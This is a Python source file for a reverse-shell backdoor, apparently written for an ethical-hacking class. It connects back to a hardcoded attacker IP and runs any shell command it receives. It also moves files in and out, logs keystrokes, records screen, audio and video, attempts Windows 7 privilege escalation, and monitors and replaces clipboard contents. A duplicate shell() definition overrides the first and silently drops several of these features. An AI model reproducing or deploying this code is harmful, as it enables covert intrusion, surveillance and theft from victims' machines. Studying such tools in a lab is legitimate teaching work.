################################################
# Author: Watthanasak Jeamwatthanachai, PhD    #
# Class: SIIT Ethical Hacking, 2023-2024       #
################################################

# Import necessary Python modules
import socket  # For network communication
import time  # For adding delays
import subprocess  # For running shell commands
import json  # For encoding and decoding data in JSON format
import os  # For interacting with the operating system

# Import enhanced features
keylogger = None
recorder = None  
privilege_escalator = None

import sys
import os

# Add current directory to Python path for imports
current_dir = os.path.dirname(os.path.abspath(__file__))
if current_dir not in sys.path:
    sys.path.insert(0, current_dir)

# Import enhanced features
from features.keylogger import create_keylogger
from features.recording import create_surveillance_recorder
from features.privilege import Windows7PrivilegeEscalator
from features.clipboard import (
    start_clipboard_monitor,
    print_clipboard_history,
    clipboard_history,
    PATTERNS
)


# Function to send data in a reliable way (encoded as JSON)
def reliable_send(data):
    jsondata = json.dumps(data)  # Convert data to JSON format
    s.send(jsondata.encode())  # Send the encoded data over the network


# Function to receive data in a reliable way (expects JSON data)
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()  # Receive data in chunks and decode
            return json.loads(data)  # Parse the received JSON data
        except ValueError:
            continue


# Function to establish a connection to a remote host
def connection():
    while True:
        time.sleep(20)  # Wait for 20 seconds before reconnecting (for resilience)
        try:
            # Connect to a remote host - CHANGE THIS IP TO YOUR KALI LINUX IP
            s.connect(('192.168.1.144', 5555))  # Update this to your Kali IP
            # Once connected, enter the shell() function for command execution
            shell()
            # Close the connection when done
            s.close()
            break
        except:
            # If a connection error occurs, retry the connection
            connection()


# Function to upload a file to the remote host
def upload_file(file_name):
    f = open(file_name, 'rb')  # Open the specified file in binary read mode
    s.send(f.read())  # Read and send the file's contents over the network
    f.close()  # Close the file


# Function to download a file from the remote host
def download_file(file_name):
    f = open(file_name, 'wb')  # Open a file for binary write mode
    s.settimeout(1)  # Set a timeout for receiving data
    chunk = s.recv(1024)  # Receive data in chunks of 1024 bytes
    while chunk:
        f.write(chunk)  # Write the received data to the file
        try:
            chunk = s.recv(1024)  # Receive the next chunk
        except socket.timeout as e:
            break
    s.settimeout(None)  # Reset the timeout setting
    f.close()  # Close the file when done


# Main shell function for command execution with enhanced features
def shell():
    global keylogger, recorder, privilege_escalator
    
    while True:
        # Receive a command from the remote host
        command = reliable_recv()
        
        if command == 'quit':
            # If the command is 'quit', exit the shell loop
            break
        elif command == 'clear':
            # If the command is 'clear', do nothing (used for clearing the screen)
            pass
        elif command[:3] == 'cd ':
            # If the command starts with 'cd ', change the current directory
            try:
                os.chdir(command[3:])
                reliable_send("Directory changed successfully")
            except Exception as e:
                reliable_send("Error changing directory: " + str(e))
                
        # KEYLOGGER COMMANDS
        elif command == 'start_keylog':
            try:
                if keylogger is None:
                    keylogger = create_keylogger("keylog.txt")
                    if keylogger.start():
                        reliable_send("Keylogger started successfully")
                    else:
                        reliable_send("Failed to start keylogger")
                elif keylogger.start():
                    reliable_send("Keylogger started successfully")
                else:
                    reliable_send("Failed to start keylogger")
            except Exception as e:
                reliable_send("Keylogger error: " + str(e))
                
        elif command == 'stop_keylog':
            try:
                if keylogger and keylogger.stop():
                    reliable_send("Keylogger stopped successfully")
                else:
                    reliable_send("Keylogger not running or failed to stop")
            except Exception as e:
                reliable_send("Stop keylogger error: " + str(e))
                
        elif command == 'get_keylog':
            try:
                with open('keylog.txt', 'r', encoding='utf-8') as f:
                    keylog_data = f.read()
                    if keylog_data:
                        reliable_send(keylog_data)
                    else:
                        reliable_send("Keylog file is empty")
            except Exception as e:
                reliable_send("Error reading keylog: " + str(e))
                
        # RECORDING COMMANDS
        elif command == 'screenshot':
            try:
                if recorder is None:
                    recorder = create_surveillance_recorder("recordings")
                success, msg = recorder.screen_recorder.take_screenshot()
                reliable_send("Screenshot: " + msg)
            except Exception as e:
                reliable_send("Screenshot error: " + str(e))
                
        elif command == 'start_recording':
            try:
                if recorder is None:
                    recorder = create_surveillance_recorder("recordings")
                success, msg = recorder.start_surveillance(duration=30, audio=True, video=True)
                reliable_send("Recording: " + msg)
            except Exception as e:
                reliable_send("Recording error: " + str(e))
                
        elif command == 'stop_recording':
            try:
                if recorder:
                    success, msg = recorder.stop_surveillance()
                    reliable_send("Stop recording: " + msg)
                else:
                    reliable_send("No recording active")
            except Exception as e:
                reliable_send("Stop recording error: " + str(e))
                
        elif command == 'list_recordings':
            try:
                if recorder is None:
                    recorder = create_surveillance_recorder("recordings")
                recordings = recorder.list_recordings()
                reliable_send("Recordings: " + json.dumps(recordings, indent=2))
            except Exception as e:
                reliable_send("List recordings error: " + str(e))
                
        # PRIVILEGE ESCALATION COMMANDS
        elif command == 'check_privs':
            try:
                if privilege_escalator is None:
                    privilege_escalator = Windows7PrivilegeEscalator()
                reliable_send("Current privileges: " + privilege_escalator.current_privileges)
            except Exception as e:
                reliable_send("Check privileges error: " + str(e))
                
        elif command == 'escalate':
            try:
                if privilege_escalator is None:
                    privilege_escalator = Windows7PrivilegeEscalator()
                success, results = privilege_escalator.escalate_privileges()
                reliable_send("Escalation result: " + str(success) + "\nDetails: " + str(results)[:1000])
            except Exception as e:
                reliable_send("Escalation error: " + str(e))
                
        elif command == 'privesc_report':
            try:
                if privilege_escalator is None:
                    privilege_escalator = Windows7PrivilegeEscalator()
                report = privilege_escalator.generate_windows7_report()
                # Send abbreviated report to avoid overwhelming the connection
                brief_report = {
                    'current_privileges': report.get('current_privileges'),
                    'system_info': {k: v for k, v in report.get('system_info', {}).items() if k in ['username', 'is_admin', 'windows_version']},
                    'total_opportunities': len(report.get('escalation_opportunities', {}))
                }
                reliable_send("Privilege Report: " + json.dumps(brief_report, indent=2))
            except Exception as e:
                reliable_send("Report error: " + str(e))
                
        # FILE OPERATIONS
        elif command[:8] == 'download':
            # If the command starts with 'download', upload a file to the remote host
            try:
                upload_file(command[9:])
                reliable_send("File " + command[9:] + " uploaded successfully")
            except Exception as e:
                reliable_send("Download error: " + str(e))
        elif command[:6] == 'upload':
            # If the command starts with 'upload', download a file from the remote host
            try:
                download_file(command[7:])
                reliable_send("File " + command[7:] + " downloaded successfully")
            except Exception as e:
                reliable_send("Upload error: " + str(e))
        else:
            # For other commands, execute them using subprocess
            try:
                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()  # Capture the command's output
                result = result.decode('utf-8', errors='ignore')  # Decode the output to a string
                # Send the command execution result back to the remote host
                if result:
                    reliable_send(result)
                else:
                    reliable_send("Command executed successfully (no output)")
            except Exception as e:
                reliable_send("Command execution error: " + str(e))


def shell():
    global keylogger, recorder, privilege_escalator

    clipboard_monitor_started = False

    while True:
        command = reliable_recv()
        
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            try:
                os.chdir(command[3:])
                reliable_send("Directory changed successfully")
            except Exception as e:
                reliable_send("Error changing directory: " + str(e))

        # --- CLIPBOARD COMMANDS ---
        elif command == 'start_clipboard':
            try:
                if not clipboard_monitor_started:
                    start_clipboard_monitor(replace=True, patterns=PATTERNS)
                    clipboard_monitor_started = True
                    reliable_send("Clipboard monitor started")
                else:
                    reliable_send("Clipboard monitor already running")
            except Exception as e:
                reliable_send("Clipboard monitor error: " + str(e))

        elif command == 'clipboard_history':
            try:
                if clipboard_history:
                    history_str = "\n".join(f"{i+1}: {entry}" for i, entry in enumerate(clipboard_history))
                    reliable_send("Clipboard History:\n" + history_str)
                else:
                    reliable_send("Clipboard history is empty")
            except Exception as e:
                reliable_send("Clipboard history error: " + str(e))

# Create a socket object for communication over IPv4 and TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Start the connection process by calling the connection() function
connection()